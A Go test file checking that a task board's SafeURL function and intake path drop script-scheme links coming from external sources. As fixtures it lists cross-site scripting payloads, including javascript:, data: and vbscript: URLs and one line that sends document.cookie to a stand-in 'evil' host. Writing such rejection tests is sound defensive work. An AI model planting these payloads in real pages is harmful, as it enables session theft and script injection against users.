package store

import "testing"

// Links that come from outside.
//
// A source is a script reading GitHub or Zendesk, and whatever it prints
// becomes a link on a card. HTML escaping protects the ATTRIBUTE and does
// nothing about the SCHEME: `javascript:alert(1)` survives escaping intact and
// runs in the board's own context, where the settings, the grouping expression
// and every card live. Found by Mercurius round two as C4.

func TestOnlyWebLinksSurvive(t *testing.T) {
	for _, ok := range []string{
		"https://github.com/openziti/ziti/issues/4211",
		"http://localhost:8080/x",
		"HTTPS://EXAMPLE.COM/Y",
	} {
		if SafeURL(ok) == "" {
			t.Fatalf("%q was dropped and should not have been", ok)
		}
	}

	for _, bad := range []string{
		"javascript:alert(1)",
		"JavaScript:alert(1)",
		"  javascript:alert(1)  ",
		"data:text/html,<script>alert(1)</script>",
		"vbscript:msgbox(1)",
		"file:///c:/windows/system32",
		// No scheme at all is not a link either. It would resolve against the
		// board's own origin, which is not what a source meant to say.
		"not a url",
		"//evil.example.com/x",
		"",
		"   ",
	} {
		if got := SafeURL(bad); got != "" {
			t.Fatalf("SafeURL(%q) = %q, wanted it dropped", bad, got)
		}
	}
}

// It is applied where links enter, not only where they are drawn, so bad data
// never reaches the database.
func TestABadLinkNeverReachesACard(t *testing.T) {
	s := open(t)
	task, _, err := s.Register(Observed{WireName: "u1", Worktree: "d:/w", Runner: "claude"})
	if err != nil {
		t.Fatal(err)
	}
	if err := s.SetOrigin(task.ID, "github", "4211", "javascript:alert(1)"); err != nil {
		t.Fatal(err)
	}
	got, err := s.Get(task.ID)
	if err != nil {
		t.Fatal(err)
	}
	if got.URL != "" {
		t.Fatalf("a script url was stored: %q", got.URL)
	}
	// And the rest of the origin still landed, because dropping the link is
	// not a reason to lose the identifier.
	if got.ExternalID != "4211" {
		t.Fatal("dropping the link dropped the identifier with it")
	}
}

// Same at the intake end, which is the one that actually faces outward.
func TestABadLinkFromASourceIsDropped(t *testing.T) {
	s := open(t)
	got, _, err := s.Offer(IntakeItem{
		Source: "github", ExternalID: "4211", Title: "x",
		URL: "javascript:fetch('http://evil/'+document.cookie)",
	})
	if err != nil {
		t.Fatal(err)
	}
	if got.URL != "" {
		t.Fatalf("a source put a script url on a card: %q", got.URL)
	}
	// The card is still raised. An item with a bad link is still work.
	if got.ExternalID != "4211" {
		t.Fatal("the item was lost along with its link")
	}
}
